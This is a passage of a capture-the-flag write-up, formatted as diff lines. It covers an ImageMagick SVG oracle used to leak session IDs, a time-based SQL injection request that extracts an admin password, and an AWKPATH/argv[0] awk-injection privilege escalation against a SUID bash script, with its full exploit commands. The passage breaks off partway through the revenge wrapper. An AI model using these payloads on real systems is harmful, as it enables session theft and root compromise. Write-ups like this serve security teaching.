+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;vid:msl:/tmp/sess_*&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;100&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/SVG&gt;</span>
+</span></span></code></pre></div><p>Then, after several attempts, I thought : if we can expand filenames using the <code>vid</code> format in a controlled way, we could guess the admin session filename character by character, in other words, we can turn this into a kind of <strong>SVG oracle</strong> ^^
+Nevertheless, we still need to observe a difference in behavior depending on whether the targeted file exists or not to leverage that.</p>
+<p>I changed <code>msl</code> with <code>text</code> and that is when magic (or let&rsquo;s say imagick x) ) happened with this payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;SVG</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;100&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#75715e">&lt;!--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">%PDF-1.3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;rect</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">fill=</span><span style="color:#e6db74">&#34;green&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;vid:text:/tmp/sess_*&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;100&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/SVG&gt;</span>
+</span></span></code></pre></div><p>the thumbnail was correctly finally generated.</p>
+<p><img src="image-1.png" alt="alt text"></p>
+<p>The thumbnail was correctly generated when the file existed, whereas the <code>thumbnail_path</code> is <code>null</code> when the file does not.</p>
+<p><img src="image-2.png" alt="alt text"></p>
+<p>By exploiting the different behavior in the two cases, we were able to extract the admin session ID character by character.</p>
+<p>Once logged in as admin, the final step was exploiting the SQL injection.
+By injecting a time-based payload into the <code>sort</code> parameter, we can observe response delays and hence, extract the admin password (Since this is a time-based SQLi, using dichotomy was a lifesaver as well!)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>GET /api/admin/tickets?search<span style="color:#f92672">=</span>&amp;sort<span style="color:#f92672">=</span>title%20ASC,%20<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span>%20case%20when%20substr<span style="color:#f92672">(</span>password,1,1<span style="color:#f92672">)=</span><span style="color:#e6db74">&#39;R&#39;</span>%20then%201337<span style="color:#f92672">=</span>LIKE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ABCDEFG&#39;</span>,UPPER<span style="color:#f92672">(</span>HEX<span style="color:#f92672">(</span>RANDOMBLOB<span style="color:#f92672">(</span>1000000000/2<span style="color:#f92672">))))</span>%20else%201%20end%20FROM%20users%20WHERE%20id<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>;-- HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:10000
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:140.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/140.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://localhost:10000/admin
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Cookie: firefox-icon-notification-confirm<span style="color:#f92672">=</span>true; session_id<span style="color:#f92672">=</span>b73e15c2f9998d0e7b6751f64a9316e3
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Finally, we obtained our flag: <code>RM{RubY_1s_f1nally_N0t_My_l4nguage}</code></p>
+<hr>
+<h2 id="day-18---hate-your-job---_initial--revenge_">Day 18 - Hate your job? - <em>Initial &amp; Revenge</em></h2>
+<p><strong>Tags</strong>: <em>Medium, System</em></p>
+<p><strong>Description :</strong></p>
+<p>Your life at work is falling apart. Your colleagues gave you socks for Secret Santa&hellip; used ones. Your manager only talks to you to forward bugs&hellip; and blame you for them. And as a final holiday gift, you&rsquo;ve been assigned to maintain &ldquo;VM Checker&rdquo;, a duct-taped bash script that even interns refuse to touch.</p>
+<p>But it technically works</p>
+<p>This Christmas, you&rsquo;ve had enough! Become root. Wreak havoc. And finally earn the respect you&rsquo;ve been denied all year. Or at least, find the flag&hellip;</p>
+<hr>
+<p>We are given the following Bash script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># I&#39;m so sorry to write this shit code ... I&#39;m not a good developer.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If you try to fix it, you&#39;ll probably break something else.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Please increment the time of hours wasted on this project.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Time: 89 hours</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/getconf PATH 2&gt;/dev/null <span style="color:#f92672">||</span> /bin/kill $$<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/home/user/vmchecker&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Error: you must run this script from /challenge&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    echo -n <span style="color:#e6db74">&#34;Enter the input: &#34;</span>
+</span></span><span style="display:flex;"><span>    read -r input
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span>$input<span style="color:#e6db74">&#34;</span> in
+</span></span><span style="display:flex;"><span>        1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># This part is totaly insecure and vulnerable to bypass. fix it please.</span>
+</span></span><span style="display:flex;"><span>            i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> p in /proc/<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span>*; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>                name<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>tr <span style="color:#e6db74">&#39;\0&#39;</span> <span style="color:#e6db74">&#39; &#39;</span> &lt; <span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74">/cmdline&#34;</span> | sed <span style="color:#e6db74">&#39;s/ *$//&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -z <span style="color:#e6db74">&#34;</span>$name<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                    echo <span style="color:#e6db74">&#34;Error: process </span>$p<span style="color:#e6db74"> has no name&#34;</span>
+</span></span><span style="display:flex;"><span>                    i<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>i+1<span style="color:#66d9ef">))</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Luckily it&#39;s protected, otherwise Benjamin, you&#39;re fired.</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$name<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;*&#39;&#39;/&#39;&#39;(&#39;&#39;{&#39;&#39;[&#39;&#39; &#39;&#39;-&#39;&#39;=&#39;&#39;s&#39;&#39;h&#39;</span><span style="color:#f92672">]</span>*  <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                    echo <span style="color:#e6db74">&#34;Error: unsafe process name detected. for process </span>$p<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                    i<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>i+1<span style="color:#66d9ef">))</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>                awk <span style="color:#e6db74">&#34;</span>$name<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74">/status&#34;</span> &lt; /dev/null 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                    echo <span style="color:#e6db74">&#34;Error: suspicious mapping detected. for process </span>$p<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                    i<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>i+1<span style="color:#66d9ef">))</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $i -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;[-] no unsafe process name or suspicious mapping detected&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;[-] </span>$i<span style="color:#e6db74"> unsafe process name or suspicious mapping detected. Check before push in production&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>            ;;
+</span></span><span style="display:flex;"><span>        2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Benjamin can you please fix the fucking code ... I SPAMMED YOU</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># I&#39;m not sure if you&#39;re a genius or a dumbass, but you&#39;re definitely not a good developer.</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># You&#39;re a fucking idiot. Remove the option 2 or make it more secure.</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;cleaning up...&#34;</span>
+</span></span><span style="display:flex;"><span>            rm -rf /tmp/proc_*
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> p in /proc/<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span>*; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>                cgroup<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74">/cgroup&#34;</span>
+</span></span><span style="display:flex;"><span>                maps<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>awk <span style="color:#e6db74">&#34;</span>$cgroup<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74">/maps&#34;</span> &amp;&gt; /dev/null<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                    /bin/bash -c <span style="color:#e6db74">&#34;echo &#39;Error: cgroup not found for cgroup: </span>$cgroup<span style="color:#e6db74">&#39; &gt; /dev/null 2&gt;&amp;1&#34;</span> &lt; /dev/null
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;[-] cleaning up done&#34;</span>
+</span></span><span style="display:flex;"><span>            ;;
+</span></span><span style="display:flex;"><span>        3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Nice dead code man ... you&#39;re a fucking idiot.</span>
+</span></span><span style="display:flex;"><span>            ;;
+</span></span><span style="display:flex;"><span>        *<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Invalid input&#34;</span> 
+</span></span><span style="display:flex;"><span>            ;;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">esac</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>This script is executed as SUID root using a wrapper binary.</p>
+<p>The main script logic is the following :</p>
+<ul>
+<li>It enforces execution from <code>/home/user/vmchecker</code></li>
+<li>It provides three options (actually two):
+<ul>
+<li>
+<p><strong>Option 1 :</strong> it iterates over <code>/proc/[pid]</code> and reads each process command line, then, after applying a blacklist filter on process names, it passes the process name directly as an argument to <code>awk</code> command.</p>
+</li>
+<li>
+<p><strong>Option 2 :</strong> it attempts to clean temporary files matching <code>/tmp/proc_*</code>, then iterates over all running processes in <code>/proc</code>. For each process, it invokes <code>awk</code>, using the process’s <code>cgroup</code> file path as the awk program and the process’s maps file as input, redirecting all output to <code>/dev/null</code>.
+If the awk invocation fails (non-zero exit code), the script executes a subshell using <code>/bin/bash -c</code> to print an error message, while suppressing both stdout and stderr.</p>
+</li>
+<li>
+<p><strong>Option 3 :</strong> Dead code so nothing much</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>Let&rsquo;s also note that we cannot create any file in <code>/home/user/vmchecker</code> as it is owned by root and that our flag is stored with a random filename in the directory <code>/root/smell_like_a_flag/</code> as showcased in the Dockerfile :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>RUN mv /root/flag.txt /root/smell_like_a_flag/flag<span style="color:#66d9ef">$(</span>head -c <span style="color:#ae81ff">16</span> /dev/urandom | base64 | tr -dc <span style="color:#e6db74">&#39;a-zA-Z0-9&#39;</span> | head -c 32<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>RUN chown root:root /home/user/vmchecker <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    chmod <span style="color:#ae81ff">740</span> -R /root
+</span></span></code></pre></div><p>We know that we can control the command line (<code>argv[0]</code>) of processes which we create.</p>
+<p>On the one side, in option 1, this value is passed directly to <code>awk</code> as the program argument, which we can maybe exploit to achieve awk injection given by <code>awk &lt;our_process_cmdline&gt; &lt;file&gt;</code>.
+Nevertheless, there is a very strict blacklist that blocks the following characters which are usually essential for meaningful <code>awk</code> programs : <code>* / ( { [ &lt;space&gt; - = s h</code></p>
+<p>On the flip side, for the second option, injecting into <code>awk</code> would require influencing a process’s  <code>cgroup</code> path. This would mean either writing to <code>/proc</code> (which is not feasible, as <code>/proc</code> is a virtual filesystem) or modifying cgroups, which generally requires root privileges afaik. Therefore, this approach is quite harder.</p>
+<p>Well, these are only first intuitions, let’s now dive into the actual exploitation.</p>
+<h3 id="initial-challenge">Initial Challenge</h3>
+<p>The wrapper of the initial challenge is the following :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setgroups</span>(<span style="color:#ae81ff">0</span>, NULL) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setgroups&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setresgid</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setresgid&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setresuid</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setresuid&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/home/user/vmchecker/pwnme.sh&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here, the SUID binary uses <code>system()</code> to execute the script and since <code>system()</code> inherits environment variables, we can influence the latter.</p>
+<p>In particular, we can exploit the <a href="https://www.gnu.org/software/gawk/manual/html_node/AWKPATH-Variable.html"><code>AWKPATH</code></a> environment variable to force <code>awk</code> to load scripts from a directory that we control. Then, we can create a process in a way that the <code>awk</code> command runs files from that directory, no characters blacklist limitations ^^ Let&rsquo;s do that.</p>
+<p>We define <code>AWKPATH</code> as <code>/tmp</code> and create an <code>awk</code> script that reads the flag and writes it to <code>/tmp/flag.txt</code>. Since we can control the command line of a process, we can use it to inject an <code>@include</code> directive in the <code>awk</code> command which becomes :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>export AWKPATH<span style="color:#f92672">=</span>/tmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create awk script</span>
+</span></span><span style="display:flex;"><span>cat &gt; /tmp/t.awk <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BEGIN{ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    system(&#34;cat /root/smell_like_a_flag/flag* &gt; /tmp/flag.txt&#34;) 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set awk payload</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;@include\&#34;t.awk\&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /tmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create pauser</span>
+</span></span><span style="display:flex;"><span>cat &gt; pauser.c <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;unistd.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">int main() { pause(); return 0; }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>gcc -o pauser pauser.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run pauser with payload as argv[0]</span>
+</span></span><span style="display:flex;"><span>exec -a <span style="color:#e6db74">&#34;</span>$payload<span style="color:#e6db74">&#34;</span> ./pauser &amp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /home/user/vmchecker
+</span></span><span style="display:flex;"><span>./pwnme 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>Enter the input: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/1
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/13
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/19
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/20
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/31
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/32
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/33
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> <span style="color:#ae81ff">7</span> unsafe process name or suspicious mapping detected. Check before push in production
+</span></span></code></pre></div><p>At this point, the flag is written to <code>/tmp/flag.txt</code>, and we can read it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>user@hate-your-job:~/vmchecker$ ls /tmp/
+</span></span><span style="display:flex;"><span>flag.txt  pauser  pauser.c  t.awk
+</span></span><span style="display:flex;"><span>user@hate-your-job:~/vmchecker$ cat /tmp/flag.txt 
+</span></span><span style="display:flex;"><span>RM<span style="color:#f92672">{</span>You_h4te_y0ur_j0b_but_s3cr3t_s4nt4_g4v3_y0u_socks_for_Chr1stmas_n0w_y0u_f33l_b3tt3r_y0u_w1ll_f1nd_a_n3w_j0b_n3xt_y34r<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="revenge">Revenge</h3>
+<p>Below is the wrapper for the revenge challenge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;grp.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setgroups</span>(<span style="color:#ae81ff">0</span>, NULL) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setgroups&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setresgid</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setresgid&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">setresuid</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;setresuid&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv_[] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;pwnme.sh&#34;</span>, NULL };
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> { NULL };
